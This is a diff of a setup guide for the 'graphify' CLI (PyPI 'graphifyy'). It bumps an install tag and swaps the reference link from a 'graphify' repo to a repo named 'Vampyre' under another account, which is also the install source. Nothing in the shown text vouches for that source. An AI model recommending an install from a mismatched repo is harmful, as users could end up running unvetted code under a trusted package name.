@@ -20,7 +20,7 @@ git checkout 6085fd66
 ### 2. Install the CLI
 
 ```powershell
-uv tool install --force "graphifyy @ git+https://github.com/hypnwtykvmpr/vampyre.git@v9"
+uv tool install --force "graphifyy @ git+https://github.com/hypnwtykvmpr/vampyre.git@v0.9.5"
 ```
 
 > The PyPI package is `graphifyy` (double-y). The CLI command is `graphify`.
@@ -83,6 +83,6 @@ rsl-siege-manager is structurally interesting for graphify evaluation because:
 
 ## Reference
 
-- graphify repo: https://github.com/safishamsi/graphify
+- Vampyre repo: https://github.com/hypnwtykvmpr/vampyre
 - graphify PyPI: https://pypi.org/project/graphifyy/
 - rsl-siege-manager: https://github.com/glitchwerks/rsl-siege-manager
